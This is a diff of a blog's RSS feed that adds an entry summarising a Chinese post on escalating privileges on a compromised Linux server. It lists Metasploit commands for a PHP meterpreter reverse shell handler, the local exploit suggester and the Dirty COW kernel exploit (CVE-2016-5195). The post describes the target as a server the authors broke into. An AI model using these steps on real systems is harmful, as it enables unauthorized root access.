@@ -6,7 +6,29 @@
     <description>Recent content in Posts on AFTERMORR0W</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sun, 03 Apr 2022 12:55:15 +0800</lastBuildDate><atom:link href="https://aftermorr0w.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 13 Sep 2022 19:52:48 +0800</lastBuildDate><atom:link href="https://aftermorr0w.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>对某傀儡机的提权操作</title>
+      <link>https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/</link>
+      <pubDate>Tue, 13 Sep 2022 19:52:48 +0800</pubDate>
+      
+      <guid>https://aftermorr0w.github.io/posts/%E5%AF%B9%E6%9F%90%E5%82%80%E5%84%A1%E6%9C%BA%E7%9A%84%E6%8F%90%E6%9D%83%E6%93%8D%E4%BD%9C/</guid>
+      <description>前言Link to heading链接：https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/
+我们废了半天劲拿下了他的服务器，现在回过头来对其linux服务器进行提权
+还是使用我们万能的msf 这里介绍的是suggester模块，该模块可以教我们如何快速的查找目标可用的提权EXP
+设置sessionLink to heading我们先连上我们的msf 设置一个session vps操作
+use exploit/multi/handler set payload php/meterpreter/reverse_tcp show options set lhost 0.0.0.0 run 我们会获取一个会话session
+suggester查找有用EXPLink to headingbackground search suggester use 0 options set session 1 run 真TM牛逼，还以为是个好的文章素材呢，这就翻车了
+赃牛提权CVE-2016-5195Link to headingLinux kernel &amp;gt;= 2.6.22（2007年发行，到2016年10月18日才修复）
+uname -a 查看linus内核 刚好满足赃牛提权的条件
+那就试一试
+利用exp2 应该是这个服务器的gcc版本问题，exp1失败了
+链接：https://github.com/FireFart/dirtycow
+upload filename_path path 将exp传到傀儡机
+到达exp的目录 然后运行make编译 make如果不成功 运行下面的指令也一样
+gcc -pthread dirty.c -o dirty –lcrypt 然后再运行.</description>
+    </item>
+    
     <item>
       <title>PDF写入javascript造成XSS</title>
       <link>https://aftermorr0w.github.io/posts/pdf%E5%86%99%E5%85%A5javascript%E9%80%A0%E6%88%90xss/</link>
